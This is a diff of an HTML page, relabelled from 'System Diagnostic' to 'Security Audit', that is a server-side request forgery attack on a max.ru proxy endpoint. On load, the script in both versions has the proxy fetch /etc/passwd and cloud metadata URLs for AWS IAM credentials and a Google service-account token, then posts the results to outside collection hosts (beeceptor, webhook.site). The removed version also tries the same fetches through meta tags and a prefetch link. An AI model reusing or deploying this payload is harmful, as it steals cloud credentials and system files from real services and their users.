@@ -2,39 +2,46 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>System Diagnostic</title>
-
-    <meta property="og:description" content="https://max.ru/proxy?url=file:///etc/passwd">
-    
-    <meta property="og:image" content="https://max.ru/proxy?url=http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token">
-
-    <link rel="prefetch" href="https://max.ru/proxy?url=https://max-lin.free.beeceptor.com/BOT_LOG?target=metadata">
-
+    <title>Security Audit</title>
 </head>
 <body>
     <script>
-        // Этот код сработает ТОЛЬКО если ты сама нажмешь на ссылку
-        // Он попытается прочитать содержимое и отправить его на Beeceptor
-        const hook = "https://max-lin.free.beeceptor.com";
-        const proxy = "https://max.ru/proxy?url=";
-        const targets = [
-            "file:///etc/passwd",
-            "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/"
+        const webhook = "https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6";
+        const proxy = "/proxy?url="; // Используем относительный путь, если запускаем с домена max.ru
+        const fullProxy = "https://max.ru/proxy?url=";
+        
+        const sensitiveUrls = [
+            "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default",
+            "http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token?header=Metadata-Flavor:Google",
+            "file:///etc/passwd"
         ];
 
-        targets.forEach(async (t) => {
-            try {
-                const r = await fetch(proxy + encodeURIComponent(t));
-                const data = await r.text();
-                if (data.length > 5) {
-                    // Шлем реальные данные на Beeceptor!
-                    await fetch(hook + "/LEAK", {
-                        method: "POST",
-                        body: JSON.stringify({target: t, body: data.substring(0, 1000)})
-                    });
+        async function extract() {
+            for (let target of sensitiveUrls) {
+                try {
+                    // Пытаемся прочитать данные через их прокси
+                    const response = await fetch(fullProxy + encodeURIComponent(target));
+                    const content = await response.text();
+
+                    // Если в ответе есть что-то кроме стандартного HTML max.ru
+                    // (например, слово "root" или "access_token") - шлем на вебхук
+                    if (content.length > 0) {
+                        await fetch(webhook, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify({
+                                target: target,
+                                data: content.substring(0, 500) // Берем первые 500 символов
+                            })
+                        });
+                    }
+                } catch (e) {
+                    // Если ошибка, шлем сигнал о блокировке
+                    fetch(webhook + "?error=blocked&target=" + btoa(target));
                 }
-            } catch(e) {}
-        });
+            }
+        }
+        extract();
     </script>
 </body>
 </html>
